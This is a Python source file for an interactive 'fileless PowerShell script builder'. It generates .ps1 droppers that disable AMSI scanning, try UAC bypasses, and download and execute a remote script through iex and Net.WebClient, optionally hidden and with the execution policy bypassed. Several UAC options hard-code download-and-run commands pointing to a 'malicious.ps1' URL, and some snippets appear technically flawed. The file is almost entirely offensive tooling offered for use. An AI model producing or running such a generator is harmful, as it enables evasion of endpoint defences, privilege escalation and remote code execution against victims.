import base64
import urllib.parse

def obfuscate_string(s, technique='base64'):
    if technique == 'base64':
        return base64.b64encode(s.encode('utf-8')).decode('utf-8')
    elif technique == 'hex':
        return ''.join(f'{ord(c):02x}' for c in s)
    elif technique == 'url':
        return urllib.parse.quote(s)
    else:
        return s

def get_amsi_bypass_code(method):
    if method == '1':
        return (
            "$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); "
            "$amsi.GetMethod('RemoveAll', 'NonPublic, Static').Invoke($null, $null);"
        )
    elif method == '2':
        return (
            "$Amsi = New-Object -TypeName PSObject -Property @{Method='RemoveAll'}; "
            "$Amsi.Method.Invoke($null, $null);"
        )
    elif method == '3':
        return (
            "$am = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); "
            "$amsi = $am.GetType('System.Management.Automation.AmsiUtils'); "
            "$amsi.GetMethod('RemoveAll', 'NonPublic, Static').Invoke($null, $null);"
        )
    elif method == '4':
        return (
            "$psh = [System.Management.Automation.PSCommand]::Create(); "
            "$psh.AddCommand('RemoveAll').AddArgument($null); "
            "$psh.Invoke();"
        )
    elif method == '5':
        return (
            "$am = [System.Reflection.Assembly]::Load('System.Management.Automation'); "
            "$type = $am.GetType('System.Management.Automation.AmsiUtils'); "
            "$type.GetMethod('RemoveAll', 'NonPublic, Static').Invoke($null, $null);"
        )
    else:
        return ""

def get_uac_bypass_code(method):
    if method == '1':
        return (
            "$path = 'C:\\Windows\\System32\\cmd.exe'; "
            "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); "
            "[System.Diagnostics.Process]::Start($path, '/c start');"
        )
    elif method == '2':
        return (
            "$key = 'Registry::HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\ShellFolder'; "
            "$value = [System.Text.Encoding]::Unicode.GetBytes('C:\\Windows\\System32\\cmd.exe'); "
            "New-ItemProperty -Path $key -Name 'Command' -Value $value -PropertyType String;"
        )
    elif method == '3':
        return (
            "$task = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -Command \"Start-Process PowerShell -ArgumentList '\"'\"-nop -w hidden -c 'iex (New-Object Net.WebClient).DownloadString('\"'\"'http://example.com/malicious.ps1'\"'\"')'\"'\" -Verb RunAs'; "
            "$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); "
            "Register-ScheduledTask -Action $task -Trigger $trigger -TaskName 'UACBypass';"
        )
    elif method == '4':
        return (
            "$path = [System.IO.Path]::Combine($env:Temp, 'bypass.exe'); "
            "Add-Type -TypeDefinition @' "
            "using System; using System.Diagnostics; using System.Runtime.InteropServices; "
            "[DllImport(\"shell32.dll\", CharSet = CharSet.Auto)] public static extern bool ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); "
            "public static void RunAsAdmin(string file) { ShellExecute(IntPtr.Zero, \"runas\", file, null, null, 1); } "
            "@'; "
            "[YourNamespace.Program]::RunAsAdmin($path);"
        )
    elif method == '5':
        return (
            "$shell = New-Object -ComObject Shell.Application; "
            "$folder = $shell.Namespace('C:\\Windows\\System32'); "
            "$folder.Self.InvokeVerb('runas');"
        )
    elif method == '6':
        return (
            "$processInfo = New-Object System.Diagnostics.ProcessStartInfo; "
            "$processInfo.FileName = 'powershell.exe'; "
            "$processInfo.Arguments = '-NoProfile -ExecutionPolicy Bypass -Command \"Start-Process PowerShell -ArgumentList \"-nop -w hidden -c 'iex (New-Object Net.WebClient).DownloadString('\"'\"'http://example.com/malicious.ps1'\"'\"')'\"'\" -Verb RunAs\"'; "
            "$processInfo.Verb = 'runas'; "
            "[System.Diagnostics.Process]::Start($processInfo);"
        )
    elif method == '7':
        return (
            "$com = New-Object -ComObject Shell.Application; "
            "$com.ShellExecute('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command \"Start-Process PowerShell -ArgumentList '-nop -w hidden -c (New-Object Net.WebClient).DownloadString('\"'\"'http://example.com/malicious.ps1'\"'\"')\" -Verb RunAs', '', 'runas', 1);"
        )
    elif method == '8':
        return (
            "$path = [System.IO.Path]::Combine($env:Temp, 'bypass.exe'); "
            "Add-Type -TypeDefinition @' "
            "using System; using System.Diagnostics; using System.Runtime.InteropServices; "
            "[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)] public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); "
            "@'; "
            "$startInfo = New-Object STARTUPINFO; "
            "$processInfo = New-Object PROCESS_INFORMATION; "
            "[YourNamespace.Program]::CreateProcessAsUser([System.IntPtr]::Zero, $path, '', [System.IntPtr]::Zero, [System.IntPtr]::Zero, $true, 0x00000010, [System.IntPtr]::Zero, [System.IO.Path]::GetDirectoryName($path), [ref]$startInfo, [ref]$processInfo);"
        )
    else:
        return ""

def create_powershell_script(url, encode_base64, obfuscation, amsi_method, uac_method, hidden, execution_params):
    # Choose obfuscation technique
    if encode_base64:
        encoded_url = obfuscate_string(url, 'base64')
        url_variable = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_url}'))"
    else:
        obfuscated_url = obfuscate_string(url, obfuscation)
        url_variable = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{obfuscated_url}'))"

    # AMSI and UAC bypass code selection
    amsi_bypass_code = get_amsi_bypass_code(amsi_method)
    uac_bypass_code = get_uac_bypass_code(uac_method)
    
    # Build PowerShell command
    command_template = (
        f"$ErrorActionPreference = 'SilentlyContinue'; {amsi_bypass_code} {uac_bypass_code} "
        "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{url_variable}')); "
        "iex (New-Object System.Net.WebClient).DownloadString($u) 2>&1 | Out-Null"
    )

    # Add hidden execution option
    if hidden:
        command_template = f"$command = {command_template}; Start-Process powershell -ArgumentList \"-NoProfile -Command $command\" -WindowStyle Hidden"

    # Combine with additional execution parameters
    return f"powershell {execution_params} -Command \"{command_template}\""

def main():
    print("Advanced Fileless PowerShell Script Builder with AMSI and UAC Bypass")

    url = input("Enter the URL to download: ").strip()
    encode_base64 = input("Base64 URL Encoding (y/n, default: n): ").strip().lower() == 'y'
    
    # Ask for obfuscation technique
    obfuscation = input("Obfuscation technique (base64/hex/url/none, default: base64): ").strip().lower()
    if obfuscation not in ['base64', 'hex', 'url', 'none']:
        obfuscation = 'base64'
    
    # Display AMSI bypass options
    print("Select AMSI Bypass Method:")
    print("1: RemoveAll Method")
    print("2: PSObject Method")
    print("3: Reflection Assembly Method")
    print("4: PSCommand Method")
    print("5: Partial Assembly Method")
    amsi_method = input("Enter method number (1-5, default: 1): ").strip()
    if amsi_method not in ['1', '2', '3', '4', '5']:
        amsi_method = '1'
    
    # Display UAC bypass options
    print("Select UAC Bypass Method:")
    print("1: COM Shell Application")
    print("2: Registry Command")
    print("3: Scheduled Task")
    print("4: ProcessStartInfo")
    print("5: COM ShellExecute")
    print("6: ProcessStartInfo with Verb")
    print("7: COM Shell Application (alternative)")
    print("8: CreateProcessAsUser")
    uac_method = input("Enter method number (1-8, default: 1): ").strip()
    if uac_method not in ['1', '2', '3', '4', '5', '6', '7', '8']:
        uac_method = '1'

    hidden = input("Do you want to run the script hidden? (y/n, default: n): ").strip().lower() == 'y'
    execution_params = input("Enter additional PowerShell execution parameters (default: '-NoProfile -ExecutionPolicy Bypass'): ").strip()
    if not execution_params:
        execution_params = '-NoProfile -ExecutionPolicy Bypass'

    # Create PowerShell script content
    ps_content = create_powershell_script(url, encode_base64, obfuscation, amsi_method, uac_method, hidden, execution_params)
    
    # Ask for the output file name
    custom_filename = input("Specify output file name? (y/n, default: n): ").strip().lower()
    if custom_filename == 'y':
        output_file = input("Enter the output file name (e.g., script.ps1): ").strip()
    else:
        output_file = "advanced_script.ps1"
    
    # Write the PowerShell script to the specified .ps1 file
    with open(output_file, "w") as file:
        file.write(ps_content)
    
    print(f"PowerShell script created: {output_file}")

if __name__ == "__main__":
    main()
